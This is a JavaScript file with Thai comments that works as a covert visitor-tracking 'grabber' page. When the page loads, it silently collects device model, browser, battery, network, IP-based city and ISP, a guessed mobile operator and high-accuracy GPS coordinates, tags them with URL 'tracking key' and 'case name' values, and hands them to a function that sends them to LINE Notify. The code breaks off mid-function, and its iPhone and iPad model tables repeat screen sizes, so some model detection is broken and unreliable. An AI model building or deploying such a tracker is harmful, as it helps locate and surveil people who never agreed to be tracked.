// ฟังก์ชันดึง tracking key และ case name จาก URL parameters
function getUrlParameters() {
  try {
    const urlParams = new URLSearchParams(window.location.search);
    const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
    const caseName = urlParams.get('case') || "ไม่มีค่า";
    
    console.log("ดึงค่าจาก URL parameters:");
    console.log("- trackingKey:", trackingKey);
    console.log("- caseName:", caseName);
    
    return {
      trackingKey: trackingKey,
      caseName: caseName
    };
  } catch (error) {
    console.error("ไม่สามารถดึงพารามิเตอร์จาก URL ได้:", error);
    return {
      trackingKey: "ไม่มีค่า",
      caseName: "ไม่มีค่า"
    };
  }
}

// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
(function() {
  // เก็บข้อมูลทั่วไป
  const timestamp = new Date().toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
  
  // ดึง tracking key และ case name จาก URL
  const { trackingKey, caseName } = getUrlParameters();

  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
  const deviceInfo = getDetailedDeviceInfo();
  const screenSize = `${window.screen.width}x${window.screen.height}`;
  const screenColorDepth = window.screen.colorDepth;
  const devicePixelRatio = window.devicePixelRatio || 1;
  const referrer = document.referrer || "ไม่มีข้อมูล";
  const language = navigator.language || navigator.userLanguage || "ไม่มีข้อมูล";
  const platform = navigator.platform || "ไม่มีข้อมูล";
  const connection = getConnectionInfo();
  const browser = detectBrowser();

  // ตรวจสอบการใช้งานแบตเตอรี่
  getBatteryInfo().then(batteryData => {
    // รวบรวมข้อมูลทั้งหมด
    const allDeviceData = {
      ...deviceInfo,
      screenSize,
      screenColorDepth,
      devicePixelRatio,
      language,
      platform,
      browser,
      connection,
      battery: batteryData
    };

    // สร้างตัวแปรเพื่อเก็บข้อมูลที่จะส่ง
    let dataToSend = {};
    
    // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์
    Promise.all([
      getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})),
      estimatePhoneNumber().catch(() => null)
    ])
    .then(([ipData, phoneInfo]) => {
      // เก็บข้อมูลที่จำเป็นทั้งหมด
      dataToSend = {
        timestamp: timestamp,
        ip: ipData,
        deviceInfo: allDeviceData,
        phoneInfo: phoneInfo,
        referrer: referrer,
        trackingKey: trackingKey || "ไม่มีค่า",
        caseName: caseName || "ไม่มีค่า",
        useServerMessage: true,
        requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
      };
      
      // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
      if (navigator.geolocation) {
        const locationPromise = new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            position => {
              resolve({
                lat: position.coords.latitude,
                long: position.coords.longitude,
                accuracy: position.coords.accuracy,
                gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
              });
            },
            error => {
              console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
              resolve("ไม่มีข้อมูล");
            },
            {
              timeout: 5000,
              enableHighAccuracy: true
            }
          );
        });
        
        // รอข้อมูลพิกัดไม่เกิน 5 วินาที
        Promise.race([
          locationPromise,
          new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล"), 5000))
        ])
        .then(location => {
          // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
          dataToSend.location = location;
          
          // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
          sendToLineNotify(dataToSend);
        });
      } else {
        // ถ้าไม่สามารถใช้ Geolocation API ได้
        dataToSend.location = "ไม่มีข้อมูล";
        sendToLineNotify(dataToSend);
      }
    });
  });
})();

// สร้าง ID เฉพาะสำหรับการร้องขอ
function generateUniqueId() {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
function getDetailedDeviceInfo() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "ไม่มีข้อมูล";
  const platform = navigator.platform || "ไม่ทราบ";
  const maxTouchPoints = navigator.maxTouchPoints || 0;
  
  // ข้อมูลเพิ่มเติมสำหรับการตรวจสอบ
  const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
  const isStandalone = window.navigator.standalone === true;
  const screenWidth = window.screen.width;
  const screenHeight = window.screen.height;
  const pixelRatio = window.devicePixelRatio || 1;
  
  let deviceType = "ไม่ทราบ";
  let deviceModel = "ไม่ทราบ";
  let osVersion = "ไม่ทราบ";
  let osName = "ไม่ทราบ";
  
  // ตรวจสอบ iPad ที่อาจแสดงเป็น Macintosh (iPadOS 13+)
  const isIpadOS = userAgent.match(/Mac/) && hasTouch && !userAgent.match(/iPhone/);
  
  // ตรวจสอบ OS และอุปกรณ์อย่างละเอียด
  if (userAgent.match(/iPhone|iPod/i)) {
    deviceType = "iPhone";
    osName = "iOS";
    
    // ดึงรุ่น iPhone
    const iPhoneMatch = userAgent.match(/iPhone\s*OS\s*(\d+)_(\d+)/i) || 
                         userAgent.match(/CPU\s*OS\s*(\d+)_(\d+)/i);
    
    if (iPhoneMatch) {
      osVersion = `${iPhoneMatch[1]}.${iPhoneMatch[2]}`;
      deviceModel = `iPhone (iOS ${osVersion})`;
      
      // พยายามระบุรุ่น iPhone จาก screen size และ pixel ratio
      const models = detectiPhoneModel(screenWidth, screenHeight, pixelRatio);
      if (models && models.length > 0) {
        deviceModel = models.join(" หรือ ");
      }
    }
  } 
  else if (isIpadOS || userAgent.match(/iPad/i)) {
    deviceType = "แท็บเล็ต";
    osName = "iPadOS";
    
    // ดึงเวอร์ชัน OS
    const iPadMatch = userAgent.match(/CPU\s*OS\s*(\d+)_(\d+)/i) ||
                      userAgent.match(/Version\/(\d+)\.(\d+)/i);
    
    if (iPadMatch) {
      osVersion = `${iPadMatch[1]}.${iPadMatch[2]}`;
    } else if (userAgent.match(/Mac/) && hasTouch) {
      // iPad แสดงเป็น Mac ใน iPadOS 13+
      osName = "iPadOS";
      osVersion = "13+";
    }
    
    // พยายามระบุรุ่น iPad จากขนาดหน้าจอและ ratio
    const models = detectiPadModel(screenWidth, screenHeight, pixelRatio);
    if (models && models.length > 0) {
      deviceModel = models.join(" หรือ ");
    } else {
      deviceModel = `iPad (${osName} ${osVersion})`;
    }
  }
  else if (userAgent.match(/Android/i)) {
    osName = "Android";
    
    // ตรวจสอบว่าเป็นแท็บเล็ตหรือมือถือ
    if (userAgent.match(/Mobile/i)) {
      deviceType = "มือถือ";
    } else {
      deviceType = "แท็บเล็ต";
    }
    
    // ดึงเวอร์ชัน Android
    const androidVersionMatch = userAgent.match(/Android\s+([\d.]+)/i);
    if (androidVersionMatch) {
      osVersion = androidVersionMatch[1];
    }
    
    // ดึงรุ่นอุปกรณ์ Android
    const androidModelMatch = userAgent.match(/Android[\s\/][\d\.]+;\s*([^;]+(?=\sbuild|\)))/i);
    if (androidModelMatch) {
      deviceModel = androidModelMatch[1].trim();
      
      // ลบข้อความที่ไม่จำเป็นออก
      deviceModel = deviceModel.replace(/SAMSUNG|Samsung|samsung/i, '')
                              .replace(/[_\-]/g, ' ')
                              .replace(/\s+/g, ' ')
                              .trim();
                              
      if (!deviceModel) {
        const secondaryMatch = userAgent.match(/Android[\s\/][\d\.]+;\s*([^;]+)/i);
        if (secondaryMatch) {
          deviceModel = secondaryMatch[1].trim();
        }
      }
    }
    
    // ถ้ายังไม่พบรุ่น ให้ลองตรวจสอบจากรูปแบบอื่น
    if (!deviceModel || deviceModel === "ไม่ทราบ") {
      const altMatch = userAgent.match(/;\s*(SM-[A-Z0-9]+|GT-[A-Z0-9]+|LG-[A-Z0-9]+|Pixel\s+[A-Z0-9]+)/i);
      if (altMatch) {
        deviceModel = altMatch[1];
      }
    }
    
    // รวมข้อมูล Android
    if (deviceModel && deviceModel !== "ไม่ทราบ") {
      deviceModel = `${deviceModel} (Android ${osVersion})`;
    } else {
      deviceModel = `Android ${osVersion}`;
    }
  }
  else if (userAgent.match(/Windows Phone|IEMobile/i)) {
    deviceType = "มือถือ";
    osName = "Windows Phone";
    deviceModel = "Windows Phone";
  }
  else if (userAgent.match(/Mac OS X/i) || platform.match(/Mac/i)) {
    deviceType = "คอมพิวเตอร์";
    osName = "macOS";
    
    // ดึงเวอร์ชัน macOS
    const macOSMatch = userAgent.match(/Mac OS X (\d+)[_.](\d+)[_.]?(\d+)?/i);
    if (macOSMatch) {
      // แปลง version numbers เป็นชื่อ macOS
      const majorVer = parseInt(macOSMatch[1]);
      const minorVer = parseInt(macOSMatch[2]);
      
      if (majorVer === 10) {
        const osNames = {
          10: "Yosemite",
          11: "El Capitan",
          12: "Sierra",
          13: "High Sierra",
          14: "Mojave",
          15: "Catalina"
        };
        osVersion = osNames[minorVer] ? `10.${minorVer} (${osNames[minorVer]})` : `10.${minorVer}`;
      } else if (majorVer === 11) {
        osVersion = "11 (Big Sur)";
      } else if (majorVer === 12) {
        osVersion = "12 (Monterey)";
      } else if (majorVer === 13) {
        osVersion = "13 (Ventura)";
      } else if (majorVer === 14) {
        osVersion = "14 (Sonoma)";
      } else {
        osVersion = `${majorVer}.${minorVer}`;
      }
      
      // Apple Silicon vs Intel
      const isAppleSilicon = userAgent.indexOf('ARM') > -1;
      const cpuType = isAppleSilicon ? "Apple Silicon" : "Intel";
      deviceModel = `Mac (${cpuType}, macOS ${osVersion})`;
    } else {
      deviceModel = "Mac";
    }
  }
  else if (userAgent.match(/Windows NT/i)) {
    deviceType = "คอมพิวเตอร์";
    osName = "Windows";
    
    // ดึงเวอร์ชัน Windows
    const windowsVersions = {
      '10.0': 'Windows 11/10',
      '6.3': 'Windows 8.1',
      '6.2': 'Windows 8',
      '6.1': 'Windows 7',
      '6.0': 'Windows Vista',
      '5.2': 'Windows XP x64',
      '5.1': 'Windows XP',
      '5.0': 'Windows 2000'
    };
    
    const windowsMatch = userAgent.match(/Windows NT (\d+\.\d+)/i);
    if (windowsMatch) {
      const winVer = windowsMatch[1];
      osVersion = windowsVersions[winVer] || `Windows NT ${winVer}`;
      
      // Windows 11 detection
      if (winVer === '10.0' && userAgent.indexOf('Windows NT 10.0') !== -1) {
        // Windows 11 reports as Windows NT 10.0 but with newer build numbers
        if (userAgent.match(/Windows NT 10.0;.*\sWin64;.*\sx64;.*\s(1[89]|2\d)\d{3}/)
            || userAgent.indexOf('Windows 11') !== -1) {
          osVersion = 'Windows 11';
        }
      }
      
      deviceModel = osVersion;
    } else {
      deviceModel = "Windows";
    }
  }
  else if (userAgent.match(/Linux/i) && !userAgent.match(/Android/i)) {
    deviceType = "คอมพิวเตอร์";
    osName = "Linux";
    
    // พยายามดึง Linux distribution
    if (userAgent.match(/Ubuntu/i)) {
      osVersion = "Ubuntu";
    } else if (userAgent.match(/Fedora/i)) {
      osVersion = "Fedora";
    } else if (userAgent.match(/Debian/i)) {
      osVersion = "Debian";
    } else if (userAgent.match(/SUSE/i)) {
      osVersion = "SUSE";
    } else if (userAgent.match(/Red Hat/i)) {
      osVersion = "Red Hat";
    }
    
    deviceModel = osVersion ? `Linux (${osVersion})` : "Linux";
  } else {
    // อุปกรณ์ที่ไม่รู้จัก
    deviceType = hasTouch ? "อุปกรณ์พกพา" : "คอมพิวเตอร์";
    deviceModel = platform || "ไม่ทราบ";
  }
  
  // เพิ่มข้อมูลทางเทคนิคเพื่อช่วยในการ debug (User Agent)
  const technicalInfo = `UA: ${userAgent.substring(0, 150)}${userAgent.length > 150 ? '...' : ''}`;

  return {
    userAgent: userAgent,
    vendor: vendor,
    platform: osName + " " + osVersion,
    deviceType: deviceType,
    deviceModel: deviceModel,
    hasTouch: hasTouch,
    technicalInfo: technicalInfo,
    screenWidth: screenWidth,
    screenHeight: screenHeight,
    pixelRatio: pixelRatio
  };
}

/**
 * ฟังก์ชันช่วยตรวจสอบรุ่น iPhone จากขนาดหน้าจอและ pixel ratio
 */
function detectiPhoneModel(width, height, pixelRatio) {
  // ต้องเรียงลำดับจากรุ่นใหม่ไปเก่า เพื่อให้รุ่นเฉพาะถูกตรวจพบก่อน
  // ทำให้ [width, height] เป็นมาตรฐานเดียวกัน
  const screenSize = Math.max(width, height) + 'x' + Math.min(width, height);
  const models = [];
  
  // iPhone 15 Series
  if ((screenSize === '1290x595' && pixelRatio === 3) || 
      (screenSize === '2556x1179' && pixelRatio === 3)) {
    models.push('iPhone 15 Pro Max');
  } else if ((screenSize === '1179x595' && pixelRatio === 3) || 
      (screenSize === '2556x1179' && pixelRatio === 3)) {
    models.push('iPhone 15 Pro');
  } else if ((screenSize === '1179x595' && pixelRatio === 3) || 
      (screenSize === '2532x1170' && pixelRatio === 3)) {
    models.push('iPhone 15');
  } else if ((screenSize === '1170x584' && pixelRatio === 3) || 
      (screenSize === '2340x1080' && pixelRatio === 3)) {
    models.push('iPhone 15 Plus');
  }
  // iPhone 14 Series
  else if ((screenSize === '1290x595' && pixelRatio === 3) || 
      (screenSize === '2796x1290' && pixelRatio === 3)) {
    models.push('iPhone 14 Pro Max');
  } else if ((screenSize === '1179x595' && pixelRatio === 3) || 
      (screenSize === '2556x1179' && pixelRatio === 3)) {
    models.push('iPhone 14 Pro');
  } else if ((screenSize === '1170x844' && pixelRatio === 3) || 
      (screenSize === '2532x1170' && pixelRatio === 3)) {
    models.push('iPhone 14');
  } else if ((screenSize === '1170x844' && pixelRatio === 3) || 
      (screenSize === '2778x1284' && pixelRatio === 3)) {
    models.push('iPhone 14 Plus');
  }
  // iPhone 13 Series
  else if ((screenSize === '1170x844' && pixelRatio === 3) || 
      (screenSize === '2778x1284' && pixelRatio === 3)) {
    models.push('iPhone 13 Pro Max');
  } else if ((screenSize === '1170x844' && pixelRatio === 3) || 
      (screenSize === '2532x1170' && pixelRatio === 3)) {
    models.push('iPhone 13 Pro, iPhone 13');
  } else if ((screenSize === '1080x844' && pixelRatio === 3) || 
      (screenSize === '2340x1080' && pixelRatio === 2)) {
    models.push('iPhone 13 mini');
  }
  // รุ่นเก่ากว่านี้
  else if ((screenSize === '1170x844' && pixelRatio === 3) || 
      (screenSize === '2532x1170' && pixelRatio === 3)) {
    models.push('iPhone 12 Pro, iPhone 12');
  }
  
  // หากไม่ตรงกับรุ่นที่รู้จัก
  if (models.length === 0) {
    models.push(`iPhone (หน้าจอ ${screenSize} @ ${pixelRatio}x)`);
  }
  
  return models;
}

/**
 * ฟังก์ชันช่วยตรวจสอบรุ่น iPad จากขนาดหน้าจอและ pixel ratio
 */
function detectiPadModel(width, height, pixelRatio) {
  // ต้องเรียงลำดับจากรุ่นใหม่ไปเก่า
  // ทำให้ [width, height] เป็นมาตรฐานเดียวกัน
  const screenSize = Math.max(width, height) + 'x' + Math.min(width, height);
  const models = [];
  
  // iPad Pro 12.9" (Gen 5/6)
  if ((screenSize === '1366x1024' && pixelRatio === 2) || 
      (screenSize === '2732x2048' && pixelRatio === 2)) {
    models.push('iPad Pro 12.9" (Gen 5/6)');
  }
  // iPad Pro 11" (Gen 3/4)
  else if ((screenSize === '1194x834' && pixelRatio === 2) ||
      (screenSize === '2388x1668' && pixelRatio === 2)) {
    models.push('iPad Pro 11" (Gen 3/4)');
  }
  // iPad Air (Gen 5)
  else if ((screenSize === '1180x820' && pixelRatio === 2) ||
      (screenSize === '2360x1640' && pixelRatio === 2)) {
    models.push('iPad Air (Gen 5)');
  }
  // iPad Air (Gen 4)
  else if ((screenSize === '1180x820' && pixelRatio === 2) ||
      (screenSize === '2360x1640' && pixelRatio === 2)) {
    models.push('iPad Air (Gen 4)');
  }
  // iPad Mini (Gen 6)
  else if ((screenSize === '1133x744' && pixelRatio === 2) ||
      (screenSize === '2266x1488' && pixelRatio === 2)) {
    models.push('iPad Mini (Gen 6)');
  }
  // iPad (Gen 10)
  else if ((screenSize === '1180x820' && pixelRatio === 2) ||
      (screenSize === '2360x1640' && pixelRatio === 2)) {
    models.push('iPad (Gen 10)');
  }
  // iPad (Gen 9)
  else if ((screenSize === '1080x810' && pixelRatio === 2) ||
      (screenSize === '2160x1620' && pixelRatio === 2)) {
    models.push('iPad (Gen 9)');
  }
  // iPad Pro 12.9" (Gen 1-4)
  else if ((screenSize === '1366x1024' && pixelRatio === 2) || 
      (screenSize === '2732x2048' && pixelRatio === 2)) {
    models.push('iPad Pro 12.9" (Gen 1-4)');
  }
  
  // หากไม่ตรงกับรุ่นที่รู้จัก
  if (models.length === 0) {
    models.push(`iPad (หน้าจอ ${screenSize} @ ${pixelRatio}x)`);
  }
  
  return models;
}

// ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์
function detectBrowser() {
  const userAgent = navigator.userAgent;
  const vendor = navigator.vendor || "";
  let browserName = "ไม่ทราบ";
  let browserVersion = "ไม่ทราบ";
  let browserEngine = "";

  // Browser detection based on User-Agent and vendor
  if ((userAgent.indexOf("Opera") !== -1 || userAgent.indexOf("OPR") !== -1) && vendor.indexOf("Google") === -1) {
    browserEngine = "Blink";
    if (userAgent.indexOf("OPR") !== -1) {
      const match = userAgent.match(/OPR\/(\d+\.\d+)/);
      browserName = "Opera";
      browserVersion = match ? match[1] : "ไม่ทราบ";
    } else {
      const match = userAgent.match(/Opera\/(\d+\.\d+)/);
      browserName = "Opera";
      browserVersion = match ? match[1] : "ไม่ทราบ";
    }
  } else if (userAgent.indexOf("Edg") !== -1) {
    browserEngine = "Blink (Chromium)";
    const match = userAgent.match(/Edg\/(\d+\.\d+\.\d+\.\d+)/);
    browserName = "Microsoft Edge";
    browserVersion = match ? match[1] : "ไม่ทราบ";
  } else if (userAgent.indexOf("Chrome") !== -1 && vendor.indexOf("Google") !== -1) {
    browserEngine = "Blink";
    
    // Check for Chrome variants
    if (userAgent.indexOf("Chromium") !== -1) {
      const match = userAgent.match(/Chromium\/(\d+\.\d+\.\d+\.\d+)/);
      browserName = "Chromium";
      browserVersion = match ? match[1] : "ไม่ทราบ";
    } else if (userAgent.indexOf("Brave") !== -1 || userAgent.indexOf("brave") !== -1) {
      const match = userAgent.match(/Chrome\/(\d+\.\d+\.\d+\.\d+)/);
      browserName = "Brave";
      browserVersion = match ? match[1] : "ไม่ทราบ";
    } else {
      const match = userAgent.match(/Chrome\/(\d+\.\d+\.\d+\.\d+)/);
      browserName = "Chrome";
      browserVersion = match ? match[1] : "ไม่ทราบ";
    }
  } else if (userAgent.indexOf("Safari") !== -1 && vendor.indexOf("Apple") !== -1) {
    browserEngine = "WebKit";
    const match = userAgent.match(/Version\/(\d+\.\d+\.\d+)/);
    browserName = "Safari";
    browserVersion = match ? match[1] : "ไม่ทราบ";
    
    // Check for Safari on iOS specifically
    if (userAgent.match(/iPhone|iPad|iPod/i)) {
      browserName = "Safari (iOS)";
    }
  } else if (userAgent.indexOf("Firefox") !== -1) {
    browserEngine = "Gecko";
    const match = userAgent.match(/Firefox\/(\d+\.\d+)/);
    browserName = "Firefox";
    browserVersion = match ? match[1] : "ไม่ทราบ";
  } else if ((userAgent.indexOf("MSIE") !== -1) || (userAgent.indexOf("Trident") !== -1)) {
    browserEngine = "Trident";
    if (userAgent.indexOf("MSIE") !== -1) {
      const match = userAgent.match(/MSIE (\d+\.\d+)/);
      browserName = "Internet Explorer";
      browserVersion = match ? match[1] : "ไม่ทราบ";
    } else {
      const match = userAgent.match(/rv:(\d+\.\d+)/);
      browserName = "Internet Explorer";
      browserVersion = match ? match[1] : "ไม่ทราบ";
    }
  } else if (userAgent.indexOf("SamsungBrowser") !== -1) {
    browserEngine = "Blink";
    const match = userAgent.match(/SamsungBrowser\/(\d+\.\d+)/);
    browserName = "Samsung Internet";
    browserVersion = match ? match[1] : "ไม่ทราบ";
  }
  
  // ตัดเฉพาะเวอร์ชันหลักและรอง
  if (browserVersion !== "ไม่ทราบ" && browserVersion.indexOf('.') !== -1) {
    const parts = browserVersion.split('.');
    if (parts.length >= 2) {
      browserVersion = `${parts[0]}.${parts[1]}`;
    }
  }

  return `${browserName} ${browserVersion}${browserEngine ? ' (' + browserEngine + ')' : ''}`;
}

// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
function getConnectionInfo() {
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

  let connectionInfo = {
    type: "ไม่สามารถระบุได้",
    effectiveType: "ไม่สามารถระบุได้",
    downlink: "ไม่สามารถระบุได้",
    rtt: "ไม่สามารถระบุได้",
    saveData: false,
    isWifi: false,
    isMobile: false,
    networkType: "ไม่สามารถระบุได้"
  };

  if (connection) {
    // เก็บข้อมูลพื้นฐาน
    connectionInfo.type = connection.type || "ไม่สามารถระบุได้";
    connectionInfo.effectiveType = connection.effectiveType || "ไม่สามารถระบุได้";
    connectionInfo.downlink = connection.downlink ? connection.downlink.toFixed(1) : "ไม่สามารถระบุได้";
    connectionInfo.rtt = connection.rtt || "ไม่สามารถระบุได้";
    connectionInfo.saveData = connection.saveData || false;

    // ตรวจสอบว่าเป็น WiFi หรือ Mobile
    if (connection.type === 'wifi') {
      connectionInfo.isWifi = true;
      connectionInfo.networkType = "WiFi";
    }
    else if (['cellular', 'umts', 'hspa', 'lte', 'cdma', 'evdo', 'gsm', '2g', '3g', '4g', '5g'].includes(connection.type)) {
      connectionInfo.isMobile = true;

      // ระบุประเภทเครือข่ายโทรศัพท์จาก effectiveType
      if (connection.effectiveType === 'slow-2g' || connection.effectiveType === '2g') {
        connectionInfo.networkType = "2G";
      } else if (connection.effectiveType === '3g') {
        connectionInfo.networkType = "3G";
      } else if (connection.effectiveType === '4g') {
        connectionInfo.networkType = "4G/LTE";
      } else if (connection.type === '5g') {
        connectionInfo.networkType = "5G";
      } else {
        connectionInfo.networkType = "Mobile Data";
      }
    }
    else {
      // ตรวจสอบความเร็วเพื่อคาดเดาประเภทการเชื่อมต่อ
      if (connection.effectiveType === '4g' && connection.downlink >= 7) {
        // ส่วนใหญ่ถ้า effectiveType เป็น 4g และความเร็วสูง มักจะเป็น WiFi
        connectionInfo.isWifi = true;
        connectionInfo.networkType = "WiFi (น่าจะใช่)";
      } else if (connection.effectiveType === '4g' && connection.downlink < 7) {
        connectionInfo.isMobile = true;
        connectionInfo.networkType = "4G/LTE";
      } else if (['slow-2g', '2g', '3g'].includes(connection.effectiveType)) {
        connectionInfo.isMobile = true;
        connectionInfo.networkType = "Mobile Data";
      }
    }
  } else {
    // Fallback: ตรวจจับการเชื่อมต่อแบบอนุมาน
    connectionInfo.type = "ไม่สามารถระบุ (อุปกรณ์ไม่รองรับ API)";
    
    // พยายามคาดเดาประเภทการเชื่อมต่อจากข้อมูลเบราว์เซอร์และอุปกรณ์
    const userAgent = navigator.userAgent.toLowerCase();
    if (userAgent.includes("android") || userAgent.includes("iphone")) {
      connectionInfo.isMobile = true;
      connectionInfo.networkType = "Mobile (คาดเดา)";
    } else {
      connectionInfo.isWifi = true;
      connectionInfo.networkType = "WiFi (คาดเดา)";
    }
  }

  return connectionInfo;
}

// ฟังก์ชันตรวจสอบระดับแบตเตอรี่
async function getBatteryInfo() {
  try {
    // ตรวจสอบว่าสามารถเข้าถึง Battery API ได้หรือไม่
    let battery;
    if (navigator.getBattery) {
      battery = await navigator.getBattery();
    } else if (navigator.battery || navigator.mozBattery) {
      battery = navigator.battery || navigator.mozBattery;
    }

    if (battery) {
      const level = Math.floor(battery.level * 100);
      const charging = battery.charging;
      const chargingTime = battery.chargingTime;
      const dischargingTime = battery.dischargingTime;
      
      let chargingStatus = charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ";
      
      // เพิ่มรายละเอียดเวลา (ถ้ามี)
      if (charging && chargingTime && chargingTime !== Infinity) {
        const minutes = Math.ceil(chargingTime / 60);
        chargingStatus += `, เต็มใน ~${minutes} นาที`;
      } else if (!charging && dischargingTime && dischargingTime !== Infinity) {
        const hours = Math.floor(dischargingTime / 3600);
        const minutes = Math.ceil((dischargingTime % 3600) / 60);
        chargingStatus += `, ใช้งานได้อีก ~${hours}:${minutes.toString().padStart(2, '0')}`;
      }
      
      return {
        level: level + "%",
        charging: chargingStatus,
        raw: {
          level: level,
          isCharging: charging,
          chargingTime: chargingTime,
          dischargingTime: dischargingTime
        }
      };
    }

    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
  } catch (error) {
    console.error("เกิดข้อผิดพลาดในการเข้าถึงข้อมูลแบตเตอรี่:", error);
    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
  }
}

// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
async function getIPDetails() {
  try {
    // ใช้ ipinfo.io ซึ่งรวม IP และรายละเอียดในครั้งเดียว (ฟรี ไม่ต้องใช้ API key, มี rate limit)
    const response = await fetch('https://ipinfo.io/json');
    if (!response.ok) {
      throw new Error(`ipinfo.io request failed with status ${response.status}`);
    }
    const ipDetails = await response.json();

    // จัดรูปแบบข้อมูลให้สอดคล้องกับโครงสร้างเดิม + เพิ่มเติม
    return {
      ip: ipDetails.ip || "ไม่สามารถระบุได้",
      hostname: ipDetails.hostname || "ไม่มีข้อมูล", // เพิ่ม hostname
      city: ipDetails.city || "ไม่ทราบ",
      region: ipDetails.region || "ไม่ทราบ",
      country: ipDetails.country || "ไม่ทราบ", // ipinfo ใช้ 'country' code (e.g., TH)
      loc: ipDetails.loc || "ไม่มีข้อมูล", // พิกัด lat,long จาก IP
      org: ipDetails.org || "ไม่ทราบ", // องค์กร/ISP (ASN + Name)
      postal: ipDetails.postal || "ไม่มีข้อมูล", // รหัสไปรษณีย์
      timezone: ipDetails.timezone || "ไม่ทราบ",
      // แยก ASN และ ISP/Org name ถ้าเป็นไปได้
      asn: ipDetails.org ? ipDetails.org.split(' ')[0] : "ไม่ทราบ",
      isp: ipDetails.org ? ipDetails.org.substring(ipDetails.org.indexOf(' ') + 1) : "ไม่ทราบ"
    };
  } catch (error) {
    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
    // ลองใช้ fallback (ipify) หาก ipinfo ล้มเหลว
    try {
      const basicResponse = await fetch('https://api.ipify.org?format=json');
      const basicData = await basicResponse.json();
      return { ip: basicData.ip || "ไม่สามารถระบุได้" }; // คืนค่า IP พื้นฐาน
    } catch (fallbackError) {
      console.error("ไม่สามารถดึง IP จาก fallback (ipify) ได้:", fallbackError);
      return { ip: "ไม่สามารถระบุได้" };
    }
  }
}

// ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์ (มีข้อจำกัด)
async function estimatePhoneNumber() {
  const phoneInfo = {
    mobileOperator: "ไม่สามารถระบุได้",
    possibleOperator: "ไม่สามารถระบุได้",
    countryCode: "ไม่สามารถระบุได้",
    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรงเนื่องจากข้อจำกัดความเป็นส่วนตัวของเบราว์เซอร์"
  };

  try {
    // ตรวจสอบผู้ให้บริการโทรศัพท์จากข้อมูล IP
    const ipDetails = await getIPDetails();

    // ตรวจสอบข้อมูลผู้ให้บริการจาก isp ที่ได้จาก ipapi.co
    const ispInfo = ipDetails.isp || "";

    // ตรวจสอบผู้ให้บริการในประเทศไทย
    const thaiOperators = {
      "AIS": ["AIS", "Advanced Info Service", "AWN", "ADVANCED WIRELESS NETWORK"],
      "DTAC": ["DTAC", "Total Access Communication", "DTN", "DTAC TriNet"],
      "TRUE": ["TRUE", "True Move", "TrueMove", "True Corporation", "TrueOnline", "Real Future"],
      "NT": ["CAT", "TOT", "National Telecom", "NT", "CAT Telecom", "TOT Public Company Limited"],
      "3BB": ["Triple T Broadband", "3BB", "Triple T Internet"]
    };

    // ค้นหาผู้ให้บริการจากชื่อ ISP
    for (const [operator, keywords] of Object.entries(thaiOperators)) {
      if (keywords.some(keyword => ispInfo.includes(keyword))) {
        phoneInfo.possibleOperator = operator;
        break;
      }
    }

    // ตรวจสอบข้อมูลเพิ่มเติมจาก User Agent
    const userAgent = navigator.userAgent;
    if (userAgent.includes("Android")) {
      // บนแอนดรอยด์อาจมีชื่อเครือข่ายซ่อนอยู่ใน User-Agent บางรุ่น (แต่ปัจจุบันไม่ค่อยมีแล้ว)
      for (const [operator, keywords] of Object.entries(thaiOperators)) {
        if (keywords.some(keyword => userAgent.includes(keyword))) {
          phoneInfo.mobileOperator = operator;
          break;
        }
      }
    }

    // ดึงข้อมูลประเทศจาก IP
    if (ipDetails.country) {
      phoneInfo.countryCode = ipDetails.country;

      // ถ้าเป็นประเทศไทยให้ระบุรหัสประเทศ
      if (ipDetails.country === "Thailand" || ipDetails.country === "TH") {
        phoneInfo.countryCode = "+66";
      }
    }

    // ตรวจสอบ Network Information API เพิ่มเติม
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection && connection.type === 'cellular') {
      phoneInfo.remarks = "เชื่อมต่อผ่านเครือข่ายมือถือ " + (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" ? phoneInfo.possibleOperator : "");
    }

    return phoneInfo;

  } catch (error) {
    console.error("ไม่สามารถประมาณการเบอร์โทรศัพท์ได้:", error);
    return phoneInfo;
  }
}

// ฟังก์ชันพยายามดึงข้อมูลตำแหน่ง
function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function(position) {
        // เมื่อได้รับพิกัด
        const lat = position.coords.latitude;
        const long = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        const locationData = {
          lat: lat,
          long: long,
          accuracy: accuracy,
          gmapLink: `https://www.google.com/maps?q=${lat},${long}`
        };

        // ส่งข้อมูลอีกครั้งพร้อมพิกัด
